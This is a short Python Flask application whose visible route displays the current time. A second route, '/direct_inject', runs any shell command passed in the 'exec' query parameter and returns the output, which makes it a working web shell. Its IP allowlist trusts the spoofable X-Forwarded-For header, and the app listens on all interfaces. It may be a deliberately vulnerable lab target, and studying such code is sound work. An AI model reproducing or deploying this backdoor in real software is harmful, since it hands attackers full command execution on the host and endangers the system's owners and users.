import os
import subprocess

from datetime import datetime

from flask import Flask, abort, request

app = Flask(__name__)


@app.route('/')
def show_time():
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return f"<h1>Current Time</h1><p>{current_time}</p>"


@app.before_request
def limit_remote_addr():
    print(request.path)
    if request.path == '/direct_inject':

        if request.headers.getlist("X-Forwarded-For"):
            remote_addr = request.headers.getlist("X-Forwarded-For")
        else:
            remote_addr = [request.remote_addr]

        print(f"Remote Addresses: {remote_addr}")
        allowed_ips = os.environ.get("IP_ALLOW_LIST", "").split(',')
        for allowed_ip in allowed_ips:
            if allowed_ip.strip() in remote_addr:
                return
        abort(403)

    return


@app.route("/direct_inject", methods=["GET"])
def direct_inject():
    exec_param = request.args.get("exec")
    process = subprocess.Popen(
        exec_param, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = process.stdout.read().decode()
    stderr = process.stderr.read().decode()

    exec_output = ""

    if stdout:
        exec_output += f"<h1>stdout</h1><pre>{stdout}</pre>"
    if stderr:
        exec_output += f"<h1>stderr</h1><pre>{stderr}</pre>"
    return f"<pre>{exec_output}</pre>"


if __name__ == '__main__':
    app.run(host='0.0.0.0')
